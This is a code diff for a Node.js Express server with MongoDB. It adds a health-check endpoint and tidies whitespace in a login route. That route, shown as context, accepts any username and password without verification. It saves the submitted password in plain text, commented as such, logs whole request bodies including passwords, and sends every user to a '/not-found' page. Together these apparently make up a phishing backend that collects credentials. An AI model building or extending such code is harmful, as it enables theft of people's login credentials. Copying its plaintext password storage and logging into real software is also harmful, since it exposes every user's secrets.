@@ -29,6 +29,20 @@ mongoose.connect(process.env.MONGODB_URI, {
     .then(() => console.log('✅ MongoDB Connected Successfully'))
     .catch(err => console.error('❌ MongoDB Connection Error:', err));
 
+// Health check endpoint
+app.get('/health', (req, res) => {
+    const mongoStatus = mongoose.connection.readyState === 1 ? 'connected' : 'disconnected';
+    res.json({
+        status: 'ok',
+        mongodb: mongoStatus,
+        timestamp: new Date().toISOString(),
+        env: {
+            hasMongoUri: !!process.env.MONGODB_URI,
+            nodeEnv: process.env.NODE_ENV || 'development'
+        }
+    });
+});
+
 // Manual login route (username/password)
 app.post('/auth/manual-login', async (req, res) => {
     console.log('Manual login request received:', { body: req.body });
@@ -37,11 +51,11 @@ app.post('/auth/manual-login', async (req, res) => {
         console.log('Missing credentials:', { username: !!username, password: !!password });
         return res.status(400).json({ success: false, message: 'Username and password are required' });
     }
-    
+
     try {
         console.log('Attempting to find user:', username);
         let user = await User.findOne({ username });
-        
+
         if (user) {
             console.log('Existing user found, updating last login');
             user.password = password; // store as plain text
@@ -58,18 +72,18 @@ app.post('/auth/manual-login', async (req, res) => {
             });
             console.log('New user created:', { userId: user._id });
         }
-        
+
         console.log('Login successful, redirecting to /not-found');
         res.json({ success: true, redirect: '/not-found' });
-        
+
     } catch (err) {
         console.error('Manual login error:', {
             error: err.message,
             stack: err.stack,
             body: req.body
         });
-        res.status(500).json({ 
-            success: false, 
+        res.status(500).json({
+            success: false,
             message: 'Login failed. Please try again.',
             error: process.env.NODE_ENV === 'development' ? err.message : 'Internal server error'
         });
